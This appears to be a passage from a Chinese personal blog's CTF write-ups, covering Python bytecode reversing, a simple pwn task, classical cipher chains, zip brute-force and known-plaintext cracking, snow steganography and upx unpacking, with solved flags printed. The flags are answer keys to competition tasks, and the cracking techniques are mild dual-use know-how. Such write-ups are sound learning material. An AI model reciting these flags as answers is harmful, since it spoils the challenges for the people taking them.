一般用于传递给函数作为参数<br><strong><em>LOAD_FAST</em></strong> ：        一般用于加载局部变量的值，也就是读取值，用于计算或者函数调用传传等<br><strong><em>STORE_FAST</em></strong> ：    一般用于保存值到局部变量<br><strong><em>LOAD_GLOBAL</em></strong> ： 用来加载全局变量， 包括制定函数名，类名，模块名等全局符号<br><strong><em>STORE_GLOBAL</em></strong> ：用来给全局变量赋值<br> <strong><em>BUILD_LIST</em></strong> :              用于创建一个 list 结构<br> <strong><em>BUILD_MAP</em></strong> :         用于创建一个空的dict<br> <strong><em>STORE_MAP</em></strong> :         用于初始化 dict 中的内容，赋值给变量<br> <strong><em>BUILD_SLICE</em></strong> :        用于创建切片， 对于 list ， tuple ， 字符串都可以使用slice 的方式进行访问<br><strong><em>BINARY_SUBSCR</em></strong> :         读取slice 的值<br><strong><em>STORE_SUBSCR</em></strong> :   slice 的值赋值给变量。<br> <strong><em>SETUP_LOOP</em></strong> ：        用于开始一个循环。<br><strong><em>JUMP_ABSOLUTE</em></strong>:         结束循环<br> <strong><em>POP_JUMP_IF_FALSE</em></strong> :     条件结果为 FALSE  则跳出 目标的偏移指令<br><strong><em>JUMP_FORWARD</em></strong> :           直接跳转到目标便宜指令<br><strong><em>COMPARE_OP</em></strong>:             比较指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">input</span>)                                               //加载的意思</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;give me your flag:\n&#x27;</span>)                       //会取出co_consts里的第consti个值</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span>                                                           //这个应该就是=号了，即是赋值</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (raw_flag)                                             //第一行的赋值者raw_flag</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>           <span class="number">8</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">list</span>)                                                  //这个就是个语句了<span class="built_in">list</span></span><br><span class="line">             <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (raw_flag)                                            //<span class="built_in">list</span>(raw_flag[<span class="number">6</span>:-<span class="number">1</span>])</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">3</span> (-<span class="number">1</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">20</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">1</span> (cipher)                                                //这个就是第二行的赋值者cipher</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">24</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">len</span>)                                                 //语句<span class="built_in">len</span></span><br><span class="line">             <span class="number">26</span> LOAD_FAST                <span class="number">1</span> (cipher)                                                //<span class="built_in">len</span>()</span><br><span class="line">             <span class="number">28</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">2</span> (length)                                               //第三个赋值者length</span><br><span class="line">         </span><br><span class="line">  <span class="number">8</span>          <span class="number">32</span> LOAD_GLOBAL              <span class="number">3</span> (<span class="built_in">range</span>)                                            //<span class="built_in">range</span>语句</span><br><span class="line">             <span class="number">34</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">38</span> BINARY_FLOOR_DIVIDE                                                           //到了最后，还是这条语句卡住我（哈哈）它应该是np.floor_divide这个函数吧</span><br><span class="line">             <span class="number">40</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">42</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">44</span> FOR_ITER                <span class="number">54</span> (to <span class="number">100</span>)                                              //<span class="keyword">for</span>循环 应该循环到<span class="number">100</span>句，即下一条语句正是循环的语句</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">3</span> (i)                                                        //第四个赋值者i</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (cipher)                                              //cipher这个变量</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)                                                     //<span class="number">2</span></span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">3</span> (i)                                                        //i，发现下面具有重复的语句</span><br><span class="line">             <span class="number">54</span> BINARY_MULTIPLY                                                                   //这条语句就必须想办法搞懂，它是个*号，就是乘法啦</span><br><span class="line">             <span class="number">56</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD                                                                            //加法</span><br><span class="line">             <span class="number">60</span> BINARY_SUBSCR                                                                      //加载，也就是读取数据了</span><br><span class="line">             <span class="number">62</span> LOAD_FAST                <span class="number">1</span> (cipher)                                               //cipher</span><br><span class="line">             <span class="number">64</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)                                                    //<span class="number">2</span></span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)                                                       //i</span><br><span class="line">             <span class="number">68</span> BINARY_MULTIPLY                                                                  //乘法</span><br><span class="line">             <span class="number">70</span> BINARY_SUBSCR                                                                     //加载</span><br><span class="line">             <span class="number">72</span> ROT_TWO                                                                               //关键语句 交换</span><br><span class="line">             <span class="number">74</span> LOAD_FAST                <span class="number">1</span> (cipher)                                             //cipher</span><br><span class="line">             <span class="number">76</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)                                                   //<span class="number">2</span></span><br><span class="line">             <span class="number">78</span> LOAD_FAST                <span class="number">3</span> (i)                                                      //i</span><br><span class="line">             <span class="number">80</span> BINARY_MULTIPLY                                                                 //乘法</span><br><span class="line">             <span class="number">82</span> STORE_SUBSCR                                                                      //加载</span><br><span class="line">             <span class="number">84</span> LOAD_FAST                <span class="number">1</span> (cipher)                                             //cipher</span><br><span class="line">             <span class="number">86</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)                                                   //<span class="number">2</span></span><br><span class="line">             <span class="number">88</span> LOAD_FAST                <span class="number">3</span> (i)                                                      //i</span><br><span class="line">             <span class="number">90</span> BINARY_MULTIPLY                                                                 //乘法</span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD                                                                         //加法</span><br><span class="line">             <span class="number">96</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">98</span> JUMP_ABSOLUTE           <span class="number">44</span>                                                     //这个代表着结束循环，与SETUP_LOOP搭配是<span class="keyword">while</span>循环</span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;  <span class="number">100</span> BUILD_LIST               <span class="number">0</span>                                                      //这个查到是[]这个东西</span><br><span class="line">            <span class="number">102</span> STORE_FAST               <span class="number">4</span> (res)                                                 //这里应该是 res = [] 这个东西了</span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>         <span class="number">104</span> LOAD_GLOBAL              <span class="number">3</span> (<span class="built_in">range</span>)                                        //<span class="built_in">range</span>语句</span><br><span class="line">            <span class="number">106</span> LOAD_FAST                <span class="number">2</span> (length)                                            //<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)</span><br><span class="line">            <span class="number">108</span> CALL_FUNCTION            <span class="number">1</span>                                                        </span><br><span class="line">            <span class="number">110</span> GET_ITER</span><br><span class="line">        &gt;&gt;  <span class="number">112</span> FOR_ITER                <span class="number">26</span> (to <span class="number">140</span>)                                          //这里应该也是个<span class="keyword">for</span>循环 到<span class="number">140</span>句</span><br><span class="line">            <span class="number">114</span> STORE_FAST               <span class="number">3</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>         <span class="number">116</span> LOAD_FAST                <span class="number">4</span> (res)                                                //res新的变量，对应着flag了</span><br><span class="line">            <span class="number">118</span> LOAD_METHOD              <span class="number">4</span> (append)                                      //append函数</span><br><span class="line">            <span class="number">120</span> LOAD_GLOBAL              <span class="number">5</span> (<span class="built_in">ord</span>)                                              //<span class="built_in">ord</span>函数</span><br><span class="line">            <span class="number">122</span> LOAD_FAST                <span class="number">1</span> (cipher)                                             //cipher变量</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">3</span> (i)                                                      //i</span><br><span class="line">            <span class="number">126</span> BINARY_SUBSCR                                                                    //读取切片中的值</span><br><span class="line">            <span class="number">128</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">3</span> (i)                                                      //i</span><br><span class="line">            <span class="number">132</span> BINARY_XOR                                                                          //这个应该是^异或运算啦</span><br><span class="line">            <span class="number">134</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">136</span> POP_TOP                                                                                //这个它最后应该是res.append(<span class="built_in">ord</span>(cipher[i])^i)</span><br><span class="line">            <span class="number">138</span> JUMP_ABSOLUTE          <span class="number">112</span></span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>     &gt;&gt;  <span class="number">140</span> LOAD_GLOBAL              <span class="number">6</span> (<span class="built_in">bytes</span>)                                      //<span class="built_in">bytes</span>函数</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (res)                                                  //res</span><br><span class="line">            <span class="number">144</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">146</span> LOAD_METHOD              <span class="number">7</span> (<span class="built_in">hex</span>)                                             //<span class="built_in">hex</span>函数，这个是个方法，其实可以理解成内置函数，需要“.”这个东西啦</span><br><span class="line">            <span class="number">148</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">            <span class="number">150</span> STORE_FAST               <span class="number">4</span> (res)                                                  //res</span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>         <span class="number">152</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="built_in">print</span>)                                          //这里大胆猜测就是输出flag了</span><br><span class="line">            <span class="number">154</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;your flag: &#x27;</span>)                                  //rse应该就是flag了</span><br><span class="line">            <span class="number">156</span> LOAD_FAST                <span class="number">4</span> (res)                                                 //print(<span class="string">&#x27;your flag:&#x27;</span>+res)</span><br><span class="line">            <span class="number">158</span> BINARY_ADD                                                                         //+号</span><br><span class="line">            <span class="number">160</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">162</span> POP_TOP</span><br><span class="line">            <span class="number">164</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">166</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure><p>然后我就卡在了LOAD_METHOD这个语句当中了，便想一次又一次去尝试它，毕竟到了最后的一步了。然后在我的一直坚持下，并且查阅资料，终于完美的对应上了字码节，上代码：<br><img src="https://img-blog.csdnimg.cn/2021020417502518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们用flag去输入这个代码，发现了输出的并不是我们想要的flag<br><img src="https://img-blog.csdnimg.cn/2021020417530717.png" alt="在这里插入图片描述"><br>我们又要写脚本了，哎，好不容易破解出，没想到是加密的脚本了，唉唉！写吧，没办法。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h2><p>这个打开就是个游戏，发现有点小，所以猜测是手机端（移动端），就改用了谷歌里面的手机端来查看去解它。<br><img src="https://img-blog.csdnimg.cn/20210207192243694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>hgame{do_you_know_cocos_game?}<br>这便是flag了，这个是（剽窃）借鉴（抄袭）的。</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h2><p>这道是pwn的签到题，还是简单的，附件里直接有代码，代码是个比较，而此时我们就要想办法去比较成功：<br><img src="https://img-blog.csdnimg.cn/20210202170744756.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们用ida找到paSsw0rd这个的地址：<br><img src="https://img-blog.csdnimg.cn/20210202170832413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以直接找到flag了：<br><img src="https://img-blog.csdnimg.cn/20210202170848866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="まひと"><a href="#まひと" class="headerlink" title="まひと"></a>まひと</h2><p>首先是摩斯密码，我们就用在线网站接下秘，然后是ascll码，写了个小脚本来转换成字符：<br><img src="https://img-blog.csdnimg.cn/20210202162524688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>后面有==号，就怀疑是base64解密，接下它：<br><img src="https://img-blog.csdnimg.cn/20210202162654751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后出现个名词是Vigenere，可能是维吉尼亚解密了，但此时需要密钥。Liki就是密钥，如下解密：<br>==}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz<del>uGy4n==<br>接下来就是神奇的地方了，在做这道题时，我和同学讨论时，他们的观点是有一个隐藏的hint，我当时想的是，肯定应该有 ==栅栏== 解密，因为刚开始是hgame{}这样子的，而上面的{}这个没有在那个位置上，所以猜想需要一个转换{}字符的解密过程。<br>然后接下来在网上找到了接下来的正确的解密过程，是个栅栏6解密，<br>**}!!Ch</del>K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu**<br>然后rot13解密：<br><strong>}!!Pu~X1m+YhpAr9OTpyRc_laC1sS4Lc{emagh</strong><br>翻过来就是flag了。</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h2><p>这个其实就是用base64，32，16依次解密即可，毕竟提示是有关base的，很明显了。</p><h2 id="不起眼压缩包的养成的方法-未做完"><a href="#不起眼压缩包的养成的方法-未做完" class="headerlink" title="不起眼压缩包的养成的方法(未做完)"></a>不起眼压缩包的养成的方法(未做完)</h2><p>这个一弄就可以看到：<br><img src="https://img-blog.csdnimg.cn/20210202171530773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>它说有密码，那说明有用到密码的地方。然后通过linus-kali的方法找到了那个压缩包（binwalk或foremost）：<br><img src="https://img-blog.csdnimg.cn/20210202173318575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时就需要密码了。<br>是个zip压缩包，暴力破解一下，就能解开，主要是接下来，又来了个zip，这时就要用明文攻击了：<img src="https://img-blog.csdnimg.cn/20210204174710641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h2><p>这道题听了大师傅的话，主要是以前没见过，所以费了点力气，首先刚开始是有两个文档的，第一个文档没有加密，第二个文档加了密。我首先思路就是暴力破解加密的文档，但大师傅并不是这样子的。<br>后来思路想到了第一个文档里的那串特殊的字符和一张图片，图片里面什么也没有，可能有吧（我没发现）<img src="https://img-blog.csdnimg.cn/2021020519162480.png" alt="在这里插入图片描述"><br>然后：<br><img src="https://img-blog.csdnimg.cn/20210205191706796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现是个brainfuck加密，解密后如下：<br><strong>DOYOUKNOWHIDDEN?</strong><br>输入第二个word，对了，那么再看看是个图片，此时应该就用到了图片隐写吧，但很遗憾，不是：<br><img src="https://img-blog.csdnimg.cn/20210205194233377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>刚开始我进去只有图片，其它的东西是隐藏的，不能够找到，需找到word选项里将它给去除。就能够显示了。此时，它是个snow隐写.<br>此时输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow.exe -C (txt的文件，即要进行解密的txt文档)</span><br></pre></td></tr></table></figure><p>如下flag：<br>hgame{Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX}</p><hr /><p>下面是一些比较简单的签到题，逆向两道，还比较简单，所以补充到下面啦。<br>Re1：<br>这道题刚上来就用EP看下它的信息。<br><img src="https://img-blog.csdnimg.cn/20210303165337445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>发现是upx壳，用命令 upx -d re1<br>可以解出来了。<br>Ida打开，搜索字符串，有几个特殊字符串，第一题应该没那么难，并且我没有看到有什么加密的代码，所以就直接去试试这些字符串，发现就是flag。</p><p>Re2<br>这道题其实也没那么难，没有什么加密大的，是用C++写的，但是依然比较简单啦<br><img src="https://img-blog.csdnimg.cn/20210303165410806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子就是可以了，hint是key就是flag，这里dword_42537C就是flag，把它算出来就行了。<br>hello CPY<br>这道题也不难，主要是考察脚本的能力，分析脚本，无非就是一个随机数，它还是1到10，很简单了，试试都能试出来，然后我们就可以写出脚本啦<br><img src="https://img-blog.csdnimg.cn/20210303165431627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>运行一下flag就出来了，这力我主要运用的爆破的思想，把flag{}里面的内容爆破出来。</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1456278270&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界misc新手区</title>
      <link href="posts/1b971f3/"/>
      <url>posts/1b971f3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h1><p>这道题直接将flag给出了。<img src="https://img-blog.csdnimg.cn/2021021815353351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>毕竟是新手，刚开始难度是不大的。</p><hr /><h1 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h1><p>这个是个pdf格式的<img src="https://img-blog.csdnimg.cn/20210218153806940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag隐藏在了图片上。</p><hr /><h1 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h1><p>打开是个word文档：<br><img src="https://img-blog.csdnimg.cn/20210218154030341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后在线解密：<br><img src="https://img-blog.csdnimg.cn/20210218154203607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目是十三掌，此时我们就要想到是rot13加密了，<img src="https://img-blog.csdnimg.cn/20210218154506441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时还不是我们要的flag{}形式，并且与base64加密后极为相似，所以进行base64解密：<br><img src="https://img-blog.csdnimg.cn/20210218154744341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就出来了。</p><hr /><h1 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h1><p>发现是个gif动态图，所以我们会用到一个jar包，去一帧一帧的看看里面的每一张图片。<br><img src="https://img-blog.csdnimg.cn/20210218155043460.png" alt="在这里插入图片描述"><br>此时用PS把二维码给补充完整就可以扫到flag了。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</span><br></pre></td></tr></table></figure><hr /><h1 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h1><p>这个是个游戏了<img src="https://img-blog.csdnimg.cn/20210218155431895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就开始逆向了（感觉是逆向题，而不是misc题）java逆向：<br><img src="https://img-blog.csdnimg.cn/20210218160033108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag{}里面有==，说明里面应该是 <strong><em>base64加密</em></strong> 过的，我们就要进行一次解密，才能的到正确的flag：<br><strong>flag{DajiDali_JinwanChiji}</strong></p><hr /><h1 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h1><p>是个压缩包，打开是个文件夹，有图片。</p><p><img src="https://img-blog.csdnimg.cn/20210218160506410.png" alt="在这里插入图片描述"><br>这里是可以写个脚本（奈何本人没知识，写得不出高大上（强行押韵））<br>然后摩斯在线解密就可以了。</p><hr /><h1 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h1><p>这道题感觉放错了地方，应该放道密码里面，考脑懂（洞），唉唉。<br>后来看看大师傅的wp，才知道是十六进制，然后-128，chr输出就得到flag了，没想到啊！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s), <span class="number">2</span>):<span class="comment">#这里是每两位一次，如：0，2，4...</span></span><br><span class="line">    t = <span class="string">&quot;0x&quot;</span> + s[i] + s[i+<span class="number">1</span>]<span class="comment">#两位为一个数（十六进制）</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(t, <span class="number">16</span>) - <span class="number">128</span>)<span class="comment">#将十六进制转换为十进制再减去128</span></span><br><span class="line">print(flag)<span class="comment">#打印flag</span></span><br></pre></td></tr></table></figure><p>哎！着实没想到啊！flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr}</p><hr /><h1 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h1><p>这个下载起来电脑风扇竟然动了起来！<img 